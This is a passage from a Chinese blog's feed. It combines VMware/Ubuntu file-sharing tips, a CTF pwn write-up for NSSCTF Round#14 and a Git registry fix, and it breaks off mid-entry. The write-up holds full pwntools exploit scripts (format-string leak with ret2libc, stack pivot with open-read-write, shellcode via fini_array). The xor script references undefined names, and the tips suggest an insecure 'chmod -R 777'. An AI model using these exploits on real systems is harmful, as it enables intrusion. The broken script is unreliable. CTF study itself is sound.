    <url>/2023/08/04/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E4%B8%BB%E6%9C%BA%E4%B9%8B%E9%97%B4%E4%BA%92%E4%BC%A0%E6%96%87%E4%BB%B6%E5%8F%8A%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>真的建议大家在所有功能都好用的时候存一下快照👻</p><span id="more"></span><h1 id="实现虚拟机和主机之间的拖拽"><a href="#实现虚拟机和主机之间的拖拽" class="headerlink" title="实现虚拟机和主机之间的拖拽"></a>实现虚拟机和主机之间的拖拽</h1><blockquote><p>这个解决方法适合老版本比如16，18。我在互联网上冲浪冲了这么久看到大家都在说22版本不支持拖拽，无所谓了姐麻了</p></blockquote><p>首先需要确保虚拟机的启用拖放和启用复制粘贴选项开启</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_20-12-12.png"></p><h3 id="只能复制粘贴不能拖拽"><a href="#只能复制粘贴不能拖拽" class="headerlink" title="只能复制粘贴不能拖拽"></a>只能复制粘贴不能拖拽</h3><p>虚拟机”启用拖拽”功能已开启，但是从本机往虚拟机拖拽文件时依旧被禁止！</p><p>安装 open-vm-tools-desktop 软件，它是 VMware Tools 其中的一个组件，负责支持虚拟机和主机之间的拖拽。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><h3 id="既不能复制粘贴也不能拖拽"><a href="#既不能复制粘贴也不能拖拽" class="headerlink" title="既不能复制粘贴也不能拖拽"></a>既不能复制粘贴也不能拖拽</h3><p><strong>重装 VMware Tools！</strong></p><p>首先要安装 VMware Tools，如果你是曾经有过VMware Tools 按钮会显示重新安装</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/11.png"></p><p>开机后会发现桌面上或者侧边栏多了一个光盘图标，点进去把压缩包复制到桌面</p><blockquote><p>下图是 Ubuntu22，我的 Ubuntu18 是一个光盘图标直接出现在桌面上</p></blockquote><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-32-05.png"></p><p>直接选中右键 “copy to” </p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-37-20.png"></p><p>在桌面打开 terminal， </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar zxfv [vmwatr-install-name]<br></code></pre></td></tr></table></figure><p>凡是让你回答 yes 或者 no 的都输入 yes 并回车</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-50-55.png"></p><p>凡是 [&#x2F;…&#x2F;…] 都按回车键</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-51-21.png"></p><p>下图这样就是安装好了</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-54-21.png"></p><h3 id="安装VMware-Tools选项显示灰色"><a href="#安装VMware-Tools选项显示灰色" class="headerlink" title="安装VMware Tools选项显示灰色"></a>安装VMware Tools选项显示灰色</h3><p>只需要以下三个步骤：</p><p>1.关闭虚拟机</p><p>2.在虚拟机设置分别设置<strong>CD&#x2F;DVD、CD&#x2F;DVD2和软盘三个部分</strong>为自动检测（如果你本来就是自动检测，就换成VMware安装目录中的 linux.iso）</p><p>3.再重启虚拟机，灰色字即点亮</p><blockquote><p>注意！如果开机以后还是不行，就重启，趁着屏幕是黑色的还没出现登录界面的时候再次查看，你就会发现它亮了🤗</p><p>快准狠！点击重新安装！！！</p></blockquote><h3 id="另辟新道路"><a href="#另辟新道路" class="headerlink" title="另辟新道路"></a>另辟新道路</h3><p>不就是想在主机和虚拟机之间共享文件嘛，直接打开浏览器登陆微信文件传输助手传输文件</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_17-32-09.png"></p><h1 id="实现共享文件夹"><a href="#实现共享文件夹" class="headerlink" title="实现共享文件夹"></a>实现共享文件夹</h1><blockquote><p>VMware Tools要先装好嗷~</p></blockquote><p>因为省赛断网我那个文件传输助手的招式不能用了，所以还是要建一个共享文件夹</p><h4 id="主机新建共享文件夹"><a href="#主机新建共享文件夹" class="headerlink" title="主机新建共享文件夹"></a>主机新建共享文件夹</h4><p>在主机里建一个文件夹，设置共享属性为所有人都能访问</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-11-09_10-17-20.png"></p><h4 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h4><p>在虚拟机设置里面设置共享文件夹</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/image-20231109205001186.png"></p><p>选择主机里设置的文件夹，设置 ”总是启用“</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-11-09_20-51-03.png"></p><p>开机后在命令行输入以下命令查看共享文件夹，会输出主机中的文件夹名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vmware-hgfsclient<br></code></pre></td></tr></table></figure><p>我们尝试一下手动挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo vmhgfs-fuse .host:/共享文件名 /mnt/hgfs -o allow_other<br></code></pre></td></tr></table></figure><p>这时候我们去 mnt 文件夹里就能看见共享文件夹里的东西了</p><p>每次都手动挂载太麻烦了，我们设置一下开机自动挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo vim /etc/fstab<br></code></pre></td></tr></table></figure><p>在打开的文件中最后一行添加</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">.host:<span class="hljs-regexp">/共享文件名 /m</span>nt/hgfs fuse.vmhgfs-fuse allow_other <span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h1><p>在执行文件时，你是否会遇到 <code>bash: ./pwn: Permission denied</code> 这种情况呢？</p><p>那是因为没有正确设置读取权限，我们只需要将想要用户执行读写权限的位置填入下方 <code>[]</code> 中，再复制到 terminal 中就可以解决问题了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> -R 777 [~/Desktop]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
      <tag>VMware Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF Round#14 Basic WP</title>
    <link href="/2023/08/04/NSSCTF-Round-14-Basic-WP/"/>
    <url>/2023/08/04/NSSCTF-Round-14-Basic-WP/</url>
    
    <content type="html"><![CDATA[<p>周末 NSS 的 PWN 专题，菜菜的照着别的师傅的 WP 复现一下🫥</p><span id="more"></span><h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><blockquote><p>格式化字符串+ret2libc</p></blockquote><p>是个64位的程序，开启了 canary 保护</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_main.png"></p><p>主函数中有一个明显的格式化字符串漏洞，在 <code>vlun</code> 函数中 gets 不限制输入</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_vuln.png"></p><p>考虑里用格式化字符串泄露 libc 基址，计算偏移获取 system 地址。再利用 gets 改写 GOT 表获取 shell。</p><p>格式化字符串部分 buf 存储在 BSS 段上，需要借用栈上的跳板。利用 GDB 查看 printf 处的栈数据：</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_stack.png"></p><p>栈上的第三个参数，也就是格式化字符串的第九个参数 0x7fffffffdfb8 存储的是0x7fffffffdfa8 地址，而这个地址存储 v4 的数值 （555LL 就是以十六进制存储555 这个十进制数字，就是 0x22b；同理 520LL就是 0x208），我们可以直接来改写 V4 数值实现 main 函数中的 if 条件判断进入 vuln 漏洞函数。</p><p>同时栈上的第九个参数 ( <code>%15$</code> )存储的是 canary 的值，第十一个参数 ( <code>%17$</code> ) 指向 <code>__libc_start_main+231</code>，可以推算出 libc 的基址。</p><p>所以我们的格式化字符串就构造为 <code>%520c%9$n,,%15$p,,%17$p</code>（其中 <code>,,</code> 用来分隔不同地址）</p><p>最终的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>pop_rdi=<span class="hljs-number">0x4013f3</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>payload=<span class="hljs-string">&quot;%520c%9$n,,%15$p,,%17$p&quot;</span><br>io.recvuntil(<span class="hljs-string">&#x27;I want to hear your praise of Toka\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>base=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">b&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">231</span><br>sys_addr=base+libc.sym[<span class="hljs-string">b&quot;system&quot;</span>]<br>sh_addr=base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload=cyclic(<span class="hljs-number">0x28</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;I know you like him, but you must pass my level\n&quot;</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h1><blockquote><p>栈迁移 + orw</p></blockquote><p><code>vuln()</code> 函数里面有一个长度0x10 的栈溢出，所以我们首先考虑栈迁移的利用 。同时在 <code>init()</code> 里面调用了<code>sandbox()</code> 禁用了execve，所以要使用 orw 。</p><p>首先移栈到 bss 然后利用 leave_ret ，移栈到前部执行泄露并回到 vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>bss=<span class="hljs-number">0x404800</span><br>leave_ret=<span class="hljs-number">0x40121d</span><br>pop_rdi=<span class="hljs-number">0x401353</span><br>read_addr=<span class="hljs-number">0x401292</span><br>vuln_addr=<span class="hljs-number">0x401270</span><br>puts_got=elf.got[<span class="hljs-string">b&quot;puts&quot;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">b&quot;puts&quot;</span>]<br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss)+p64(read_addr) <br>io.sendafter(<span class="hljs-string">b&quot;try it&quot;</span>,payload)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)<br>payload= payload.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(bss-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br><br>io.sendline(payload)<br>leak_addr=u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-libc.sym[<span class="hljs-string">b&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(leak_addr))<br>open_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;open&quot;</span>]<br>read_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;read&quot;</span>]<br>write_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;write&quot;</span>]<br><span class="hljs-comment">#pop_rsi = libc.address + next(libc.search(asm(&#x27;pop rsi;ret&#x27;))) </span><br><span class="hljs-comment">#pop_rdx = libc.address + next(libc.search(asm(&#x27;pop rdx;ret&#x27;))) </span><br><span class="hljs-comment">#不知道为什么我用上面的命令突然就抽风不好用我手动ROPgadget找的，就是有点子慢</span><br>pop_rsi=leak_addr+<span class="hljs-number">0x2601f</span><br>pop_rdx=leak_addr+<span class="hljs-number">0x142c92</span><br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;try it\n&quot;</span>,payload)<br><br>orw=<span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span>+p64(pop_rdi)+p64(<span class="hljs-number">0x404288</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(read_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(write_addr)<br><br>orw=orw.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&quot;a&quot;</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br>io.send(orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>题目是一个任何保护都没有被开启并且 rwx 全部开启的程序</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_xor_main.png"></p><p>首先程序中有一个 flag 判断的循环，我们要保证 flag 小于 0 程序才不会退出，方便我们进行接下来的操作。</p><p>我们可以将 flag 的高位写成 0xff，这样的话 flag 的符号位会被覆写为1，即负数。</p><p><code>xorByteWithAddress()</code> 中只有两行代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">xorByteWithAddress</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-type">char</span> a2)</span><br>&#123;<br>  *a1 ^= a2;  <span class="hljs-comment">//*addr ^= value</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)++flag;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>a1</code> 是一个指向 <code>_BYTE</code> 类型的地址（即一个字节大小的数据类型），所以在这个异或的操作中，一次只能异或改写一字节的数据。</p><p>因为 rwx 可读可写可执行，我们可以直接向上面写入 sehllcode，劫持 <code>fini_array</code> 指针到shellcode处，这样我们就可以再次异或令 flag 大于零，退出程序时执行 shellcode 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorwrite</span>(<span class="hljs-params">addr,value</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;addr:&quot;</span>,<span class="hljs-built_in">hex</span>(addr).encode())<br>    io.sendlineafter(<span class="hljs-string">b&quot;value:&quot;</span>,value)<br><br>flag=<span class="hljs-number">0x600BCC</span><br>fini_array=<span class="hljs-number">0x600970</span><br>rwx_addr=<span class="hljs-number">0x600d00</span><br><br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br><br>shellcode=asm(shellcraft.sh())<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(shellcode)):<br>    xorwrite(rwx+i,shellcode[i])<br>    <br><span class="hljs-comment">#xor_array=fini_array^rwx_addr</span><br><span class="hljs-comment">#xor_array=0x200b10</span><br>xorenc(<span class="hljs-built_in">hex</span>(fini_array).encode(),<span class="hljs-string">b&quot;0x10&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">1</span>).encode(),<span class="hljs-string">b&quot;0x0b&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">2</span>).encode(),<span class="hljs-string">b&quot;0x20&quot;</span>)<br>    <br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h1><p>是一个64位的菜单式的读取文件的程序，远程时可以直接读取服务器端的文件。</p><p>但是在 load_file 处有 “flag” 字符检测，也就是说我们不能直接 load flag，要尝试修改 flag 文件的 “flag” 字符。</p><p>同时在 read_file 处有文本长度的判断，不过长素质由用户输入，小于55时会自动读取 content_size + 56 的数据。</p><p>我们首先需要绕过 flag 的检查。</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_load.png"></p><p>在 <code>load_file()</code> 函数中，scanf 负责接受用户读入信息。我们知道scanf读取数据会在指定长度的数据后添加<code>\x00 </code>空字符</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_bss.png"></p><p>如上图，<em>file_name</em> 和 <em>file_id</em> 都是储存在 BSS 段并且相邻，偏移相差 8 字节。也就是说如果我们在 file_name 读取了刚好8字节的数据，其对应的 <code>\x00</code> 就会覆盖住 <em>file_id</em>，使 <em>file_id</em> 为 0。</p><p>而利用到 fild_id 的函数 <code>read(file_fd, file_content, content_size);</code> 在 fild_id&#x3D;0 时会从用户键盘来获取用户的输入而不是读取文件。</p><p>又因为在此之前由 alloca 来分配 v2 栈空间，我们可以利用 content_size 小于55的条件判断造成溢出，直接覆盖返回地址使程序跳转到 <code>file_fd = open(file_name, 0, 0LL);</code>，绕过检查再按照程序流程正常读取 flag 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">payload</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;file_name : &quot;</span>,payload)<br>    <br>load_addr=<span class="hljs-number">0x401493</span><br>read_addr=<span class="hljs-number">0x4014ee</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>load(<span class="hljs-string">b&quot;./&quot;</span>)<br>load(<span class="hljs-string">b&quot;flag.txt&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload=cyclic(<span class="hljs-number">0x18</span>)+p64(load_addr)+p64(ret)*<span class="hljs-number">2</span>+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;read more &quot;</span>,payload)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>libc</tag>
      
      <tag>orw</tag>
      
      <tag>stack pivoting</tag>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序修改路径后图标消失及右键无法打开的解决方案</title>
    <link href="/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<p>修改程序路径后需要进行的一些操作 </p><span id="more"></span><h2 id="更改Git目录后，鼠标右键点击Git-Bash-Here出现找不到应用程序及图标变灰"><a href="#更改Git目录后，鼠标右键点击Git-Bash-Here出现找不到应用程序及图标变灰" class="headerlink" title="更改Git目录后，鼠标右键点击Git Bash Here出现找不到应用程序及图标变灰"></a>更改Git目录后，鼠标右键点击Git Bash Here出现找不到应用程序及图标变灰</h2><p>我刚放假的时候整理了自己的文件们，就把 git 的安装目录改了，我想要用 git 传大文件上 github 就出现了如题所见的问题</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-38-05.png"></p><p>在这里点击的时候打不开，只有手动打开 Git 才会弹出弹窗</p><p>这是因为注册表没有修改</p><p>win+R，输入 regedit 打开注册表</p><p>Ctrl+F 查找目录 HKEY_CLASSES_ROOT\ Directory \ Background \ shell \</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_12-02-51.png"></p><p>就会发现注册表中的地址还是原来的地址，修改为移动后的地址即可</p><p>还有下面的shell文件夹中找到git相关的部分也需要修改，在git_gui主目录点一次，commd单独再点开。总共需要修改八处。</p><p>修改后就可以啦</p><h2 id="修改程序路径后，程序仍可使用但图标消失或变成白块"><a href="#修改程序路径后，程序仍可使用但图标消失或变成白块" class="headerlink" title="修改程序路径后，程序仍可使用但图标消失或变成白块"></a>修改程序路径后，程序仍可使用但图标消失或变成白块</h2><p>以Git Bash为例</p><p>这是因为我们点击的图案和搜索或是导航栏中显示的图标都是”快捷方式“，而它对应的路径没有修改</p><p>找到桌面或者开始菜单下找到 Git Bash 快捷方式，右键查看属性就会发现在属性中，”目标“栏里还是之前的路径，我们修改它到移动后的路径即可。</p><p><img 